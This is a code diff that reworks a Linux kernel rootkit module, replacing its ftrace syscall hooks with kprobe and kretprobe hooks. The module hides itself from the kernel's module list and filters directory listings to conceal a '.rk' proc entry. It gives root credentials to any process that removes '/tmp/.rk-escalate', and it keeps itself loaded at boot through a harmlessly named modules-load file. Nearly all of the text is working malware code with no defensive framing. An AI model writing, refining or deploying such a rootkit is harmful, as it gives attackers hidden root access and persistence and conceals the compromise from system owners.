@@ -1,167 +1,137 @@
 // SPDX-License-Identifier: GPL-2.0
+#include <linux/types.h>
 #include <linux/cred.h>
 #include <linux/dirent.h>
-#include <linux/errno.h>
 #include <linux/fs.h>
-#include <linux/ftrace.h>
 #include <linux/init.h>
 #include <linux/kobject.h>
 #include <linux/kprobes.h>
 #include <linux/list.h>
 #include <linux/module.h>
-#include <linux/printk.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
+#include <linux/umh.h>
 
 #define HIDDEN_PROC ".rk"
-#define SIG_ESCALATE 63
+#define TRIGGER_PATH "/tmp/.rk-escalate"
 #define PERSIST_PATH "/etc/modules-load.d/hello.conf"
 
 static struct proc_dir_entry *proc_entry;
-static char status_buf[256];
-
-// resolve symbols via kprobe
-static unsigned long kaddr(const char *name)
-{
-	struct kprobe kp = { .symbol_name = name };
-	unsigned long addr;
-
-	if (register_kprobe(&kp))
-		return 0;
-	addr = (unsigned long)kp.addr;
-	unregister_kprobe(&kp);
-	return addr;
-}
 
 // --- module hiding ---
 
-static struct list_head *saved_prev;
-
 static void hide_module(void)
 {
-	saved_prev = THIS_MODULE->list.prev;
 	list_del_init(&THIS_MODULE->list);
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 }
 
-// --- getdents64 hook: hide .rk from /proc listings ---
+// --- getdents64 kretprobe: hide .rk from /proc listings ---
 
-typedef long (*getdents64_t)(const struct pt_regs *);
-static getdents64_t orig_getdents64;
-static struct ftrace_ops gd_ops;
-static long hook_getdents64(const struct pt_regs *regs);
+struct getdents_ctx {
+	struct linux_dirent64 __user *dirent;
+};
 
-static void notrace gd_callback(unsigned long ip, unsigned long parent_ip,
-				 struct ftrace_ops *ops,
-				 struct ftrace_regs *fregs)
+static int entry_getdents64(struct kretprobe_instance *ri,
+			    struct pt_regs *regs)
 {
-	struct pt_regs *regs = ftrace_get_regs(fregs);
-	if (regs)
-		regs->ip = (unsigned long)hook_getdents64;
+	struct getdents_ctx *ctx = (void *)ri->data;
+	struct pt_regs *uregs = (struct pt_regs *)regs->di;
+
+	ctx->dirent = (struct linux_dirent64 __user *)uregs->si;
+	return 0;
 }
 
-static long hook_getdents64(const struct pt_regs *regs)
+static int ret_getdents64(struct kretprobe_instance *ri,
+			  struct pt_regs *regs)
 {
-	long ret;
-	struct linux_dirent64 __user *dirp;
-	char *kbuf;
+	struct getdents_ctx *ctx = (void *)ri->data;
+	long ret = regs_return_value(regs);
+	struct linux_dirent64 *cur;
+	char *buf;
 	long off;
 
-	ret = orig_getdents64(regs);
 	if (ret <= 0)
-		return ret;
+		return 0;
 
-	dirp = (struct linux_dirent64 __user *)regs->si;
-	kbuf = kmalloc(ret, GFP_KERNEL);
-	if (!kbuf)
-		return ret;
-	if (copy_from_user(kbuf, dirp, ret)) {
-		kfree(kbuf);
-		return ret;
+	buf = kvmalloc(ret, GFP_KERNEL);
+	if (!buf)
+		return 0;
+
+	if (copy_from_user(buf, ctx->dirent, ret)) {
+		kvfree(buf);
+		return 0;
 	}
 
 	off = 0;
 	while (off < ret) {
-		struct linux_dirent64 *cur = (struct linux_dirent64 *)(kbuf + off);
+		cur = (struct linux_dirent64 *)(buf + off);
 		if (strcmp(cur->d_name, HIDDEN_PROC) == 0) {
-			long remaining = ret - off - cur->d_reclen;
-			if (remaining > 0)
-				memmove(kbuf + off, kbuf + off + cur->d_reclen,
-					remaining);
+			long rest = ret - off - cur->d_reclen;
+
+			if (rest > 0)
+				memmove(buf + off,
+					buf + off + cur->d_reclen, rest);
 			ret -= cur->d_reclen;
 			continue;
 		}
 		off += cur->d_reclen;
 	}
 
-	copy_to_user(dirp, kbuf, ret);
-	kfree(kbuf);
-	return ret;
+	copy_to_user(ctx->dirent, buf, ret);
+	regs_set_return_value(regs, ret);
+	kvfree(buf);
+	return 0;
 }
 
-// --- kill hook: signal 63 escalates to root ---
+static struct kretprobe gd_krp = {
+	.kp.symbol_name	= "__x64_sys_getdents64",
+	.entry_handler	= entry_getdents64,
+	.handler	= ret_getdents64,
+	.data_size	= sizeof(struct getdents_ctx),
+	.maxactive	= 20,
+};
 
-typedef long (*kill_t)(const struct pt_regs *);
-static kill_t orig_kill;
-static struct ftrace_ops kill_ops;
-static long hook_kill(const struct pt_regs *regs);
+// --- rmdir kprobe: escalation trigger ---
 
-static void notrace kill_callback(unsigned long ip, unsigned long parent_ip,
-				   struct ftrace_ops *ops,
-				   struct ftrace_regs *fregs)
+static int pre_rmdir(struct kprobe *p, struct pt_regs *regs)
 {
-	struct pt_regs *regs = ftrace_get_regs(fregs);
-	if (regs)
-		regs->ip = (unsigned long)hook_kill;
-}
+	struct pt_regs *uregs = (struct pt_regs *)regs->di;
+	const char __user *upath = (const char __user *)uregs->di;
+	char kpath[64];
+	struct cred *cred;
 
-static long hook_kill(const struct pt_regs *regs)
-{
-	int sig = (int)regs->si;
-	pid_t target = (pid_t)regs->di;
-
-	if (target == current->pid && sig == SIG_ESCALATE) {
-		struct cred *cred = prepare_creds();
-		if (cred) {
-			cred->uid.val = 0;
-			cred->gid.val = 0;
-			cred->euid.val = 0;
-			cred->egid.val = 0;
-			commit_creds(cred);
-		}
+	if (strncpy_from_user(kpath, upath, sizeof(kpath)) <= 0)
 		return 0;
+
+	if (strcmp(kpath, TRIGGER_PATH) != 0)
+		return 0;
+
+	cred = prepare_creds();
+	if (cred) {
+		cred->uid.val = 0;
+		cred->gid.val = 0;
+		cred->euid.val = 0;
+		cred->egid.val = 0;
+		commit_creds(cred);
 	}
-	return orig_kill(regs);
+	return 0;
 }
+
+static struct kprobe rmdir_kp = {
+	.symbol_name = "__x64_sys_rmdir",
+	.pre_handler = pre_rmdir,
+};
 
 // --- proc interface (hidden, accessible by direct path) ---
 
 static int status_read(struct seq_file *m, void *v)
 {
-	seq_printf(m, "hidden=yes\npersistence=%s\nescalation=kill-%d\n",
-		   PERSIST_PATH, SIG_ESCALATE);
+	seq_printf(m, "hidden=yes\npersistence=%s\nescalation=rmdir %s\n",
+		   PERSIST_PATH, TRIGGER_PATH);
 	return 0;
-}
-
-
-// --- ftrace helper ---
-
-static int install_hook(unsigned long addr, struct ftrace_ops *ops,
-			void (*cb)(unsigned long, unsigned long,
-				   struct ftrace_ops *, struct ftrace_regs *))
-{
-	int err;
-
-	ops->func = cb;
-	ops->flags = FTRACE_OPS_FL_SAVE_REGS |
-		     FTRACE_OPS_FL_IPMODIFY |
-		     FTRACE_OPS_FL_RECURSION;
-	err = ftrace_set_filter_ip(ops, addr, 0, 0);
-	if (err)
-		return err;
-	return register_ftrace_function(ops);
 }
 
 // --- boot persistence ---
@@ -186,6 +156,7 @@ static void remove_persistence(void)
 {
 	char *argv[] = { "/bin/sh", "-c", "rm -f " PERSIST_PATH, NULL };
 	char *envp[] = { "PATH=/bin:/sbin", NULL };
+
 	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
 
@@ -193,29 +164,21 @@ static void remove_persistence(void)
 
 static int __init rootkit_init(void)
 {
-	unsigned long gd_addr, kill_addr;
 	int err;
-
-	gd_addr = kaddr("__x64_sys_getdents64");
-	kill_addr = kaddr("__x64_sys_kill");
-	if (!gd_addr || !kill_addr)
-		return -ENOENT;
 
 	proc_entry = proc_create_single(HIDDEN_PROC, 0444, NULL, status_read);
 	if (!proc_entry)
 		return -ENOMEM;
 
-	orig_getdents64 = (getdents64_t)gd_addr;
-	err = install_hook(gd_addr, &gd_ops, gd_callback);
+	err = register_kretprobe(&gd_krp);
 	if (err) {
 		proc_remove(proc_entry);
 		return err;
 	}
 
-	orig_kill = (kill_t)kill_addr;
-	err = install_hook(kill_addr, &kill_ops, kill_callback);
+	err = register_kprobe(&rmdir_kp);
 	if (err) {
-		unregister_ftrace_function(&gd_ops);
+		unregister_kretprobe(&gd_krp);
 		proc_remove(proc_entry);
 		return err;
 	}
@@ -229,8 +192,8 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
-	unregister_ftrace_function(&kill_ops);
-	unregister_ftrace_function(&gd_ops);
+	unregister_kprobe(&rmdir_kp);
+	unregister_kretprobe(&gd_krp);
 	proc_remove(proc_entry);
 	remove_persistence();
 }
